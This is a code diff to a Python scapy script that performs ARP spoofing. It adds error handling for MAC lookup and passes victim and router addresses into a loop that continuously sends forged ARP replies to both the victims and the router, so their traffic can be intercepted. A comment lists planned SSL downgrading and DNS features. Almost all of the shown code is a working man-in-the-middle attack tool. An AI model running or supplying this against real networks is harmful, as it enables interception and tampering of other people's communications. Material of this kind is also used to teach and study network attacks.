@@ -18,10 +18,14 @@ def get_mac(ip):
      
     # return a list of MAC addresses with respective
     # MAC addresses and IP addresses.
-    answ = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-    # we choose the first MAC address and select
-    # the MAC address using the field hwsrc
-    return answ[0][1].hwsrc
+    answ = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
+    if answ:
+        # we choose the first MAC address and select
+        # the MAC address using the field hwsrc
+        return answ[0][1].hwsrc
+    else:
+        raise Exception("No arp response for {}".format(ip))
+
  
  
 def arp_spoof(target_ip, spoof_ip):
@@ -37,23 +41,23 @@ def arp_spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose=False)
  
 
-def arp_main(silent, manual):
+def arp_main(silent, manual, router):
     # TOADD: 
     # - arguments: silent/allin, autoscan/manualinput, dns things, input for all addresses
     # - threads
     # - ssl downgrading
     # victim_ip = input()  # taking the victim ip_address
     # router_ip = input()  # taking the router ip address
-    victim_addresses = [] 
+    victim_addresses = manual
+    router_ip = router
     sent_packets_count = 0  # initializing the packet counter
 
     while True:
-
         for victim_ip in victim_addresses:
             sent_packets_count += 2
             arp_spoof(victim_ip, router_ip)
             arp_spoof(router_ip, victim_ip)
-            print("[+] Packets sent " + str(sent_packets_count), end="\r")
+            sys.stdout.write("[+] Packets sent " + str(sent_packets_count) + "\r")
             sys.stdout.flush()
             time.sleep(2)
 
